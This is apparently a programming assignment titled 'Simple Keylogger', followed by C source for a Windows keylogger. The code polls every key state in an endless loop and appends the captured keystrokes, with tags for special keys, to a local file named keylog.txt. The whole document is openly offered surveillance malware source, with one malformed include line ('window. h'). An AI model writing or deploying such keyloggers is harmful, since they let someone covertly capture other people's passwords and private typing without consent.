'''
Task # 04
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 

#include <stdio.h>
#include <window. h>
void log_key(int key) {
    FILE *file = fopen("keylog.txt", "a+");
    if (file == NULL) {
        return;
    }

    if (key == VK_BACK) {
        fprintf(file, "[BACKSPACE]");
    } else if (key == VK_RETURN) {
        fprintf(file, "\n");
    } else if (key == VK_SPACE) {
        fprintf(file, " ");
    } else if (key == VK_TAB) {
        fprintf(file, "[TAB]");
    } else if (key == VK_SHIFT) {
        fprintf(file, "[SHIFT]");
    } else if (key == VK_CONTROL) {
        fprintf(file, "[CTRL]");
    } else if (key == VK_ESCAPE) {
        fprintf(file, "[ESC]");
    } else if (key >= 0x30 && key <= 0x39) { // Numbers 0-9
        fprintf(file, "%c", key);
    } else if (key >= 0x41 && key <= 0x5A) { // Letters A-Z
        fprintf(file, "%c", key);
    } else {
        fprintf(file, "[%d]", key);
    }

    fclose(file);
}

// Main function
int main() {
    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                log_key(key);
            }
        }
        Sleep(10);
    }

    return 0;
}
